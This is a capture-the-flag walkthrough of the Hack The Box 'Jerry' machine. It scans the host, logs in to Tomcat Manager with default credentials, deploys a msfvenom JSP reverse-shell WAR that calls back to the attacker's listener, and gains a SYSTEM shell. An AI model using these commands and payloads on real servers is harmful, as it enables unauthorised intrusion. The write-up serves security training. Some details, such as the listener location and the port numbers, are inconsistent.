# Hack The Box - Jerry Walkthrough without Metasploit

## Enumeration
First we start by running `nmap` against the target
```nmap
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Beginner-Path/Jerry]
└─$ nmap -sC -sV -A -oA nmap 10.10.10.95 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-07 13:49 EST
Nmap scan report for 10.10.10.95
Host is up (0.13s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.29 seconds

```

Since, there's a `HTTP` service running, we'll also use gobuster for `directory brute-forcing`

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Beginner-Path/Jerry]
└─$ gobuster dir -u http://10.10.10.95:8080/ -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/common.txt -t 200 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.95:8080/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/SecLists-master/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/07 13:52:41 Starting gobuster in directory enumeration mode
===============================================================
/aux                  (Status: 200) [Size: 0]
/com4                 (Status: 200) [Size: 0]
/com3                 (Status: 200) [Size: 0]
/com2                 (Status: 200) [Size: 0]
/com1                 (Status: 200) [Size: 0]
/con                  (Status: 200) [Size: 0]
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]             
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/lpt2                 (Status: 200) [Size: 0]                     
/lpt1                 (Status: 200) [Size: 0]                     
/manager              (Status: 302) [Size: 0] [--> /manager/]     
/nul                  (Status: 200) [Size: 0]                     
/prn                  (Status: 200) [Size: 0]                     
                                                                  
===============================================================
2023/01/07 13:52:45 Finished
===============================================================

```
Performing Nikto Scan too.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Beginner-Path/Jerry]
└─$ nikto -host http://10.10.10.95:8080
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.95
+ Target Hostname:    10.10.10.95
+ Target Port:        8080
+ Start Time:         2023-01-07 14:09:33 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat.
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /manager/status: Tomcat Server Status interface found (pass protected)
+ 7967 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2020-02-20 00:19:31 (GMT-5) (382 seconds)
--------------------------------------------------------------------
+ 1 host(s) testedFinished nikto scan
                                                                                                                                                                               
=========================
```

We have one port open.
- Port `8080`: running `Apache Tomcat/Coyote JSP engine 1.1`

Before we move on to enumeration, let’s make some mental notes about the scan results.
```
Port __8080__ is running __Apache Tomcat__ and the nmap scan found the __/manager/html__ page, which is the __login__ page to the Manager interface. The nikto scan identified that this page is using the __default credentials__ __tomcat/s3cret__. Apache Tomcat by design allows you to run code, so we can simply deploy a war file that sends a reverse shell back to our attack machine.
```

Since we already have a way to get code execution on the box, we can just move on to the exploitation phase.

## Exploitation
Visit the `/manager/html` page and log in with the credentials `tomcat/s3cret`.

Generate a war file that contains a reverse shell using msfvenom.
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.7 LPORT=1234 -f war > shell.war
```

```
┌──(darshan㉿kali)-[~]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war > shell.war
Payload size: 1086 bytes
Final size of war file: 1086 bytes
```

Upload the file on the Tomcat Application Manager and deploy it.


Set up a listener on the target machine.
```
nc -nlvp 1234
```

Click on the war file in the Tomcat Application Manager to execute our shell.

```
┌──(darshan㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444
connect to [10.10.14.2] from (Unknown) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0>whoami
whoami
nt authority\system
```

We get a shell with SYSTEM privileges! That was easy! We don’t even have to escalate our privileges for this box.
Grab the user.txt and root.txt flags.

```
┌──(darshan㉿kali)-[~]
...
C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489
 
 Directory of C:\Users\Administrator\Desktop\flags
 
06/19/2018 06:09 AM    <DIR>           .
06/19/2018 06:09 AM    <DIR>           ..
06/19/2018 06:11 AM                 88 2 for the price of 1.txt
              1 File(s)              88 bytes            
              2 Dir(s)  27,601,993,728 bytes free

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
[REDACTED]

root.txt
[REDACTED]
```
